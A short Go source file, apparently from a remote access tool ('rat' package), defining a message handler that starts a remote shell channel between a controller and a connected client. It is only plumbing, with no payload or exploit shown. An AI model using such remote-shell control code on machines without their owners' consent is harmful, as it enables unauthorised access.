package main

import "rat/shared"

type ShellMessage struct {
	Action int    `json:"action"`
	Data   string `json:"data"`
}

func (m ShellMessage) Handle(controller *Controller, client *Client) error {
	switch m.Action {
	case shared.StartShell:
		client.streamChan <- ShellChannel{controller}
	}

	return nil
}
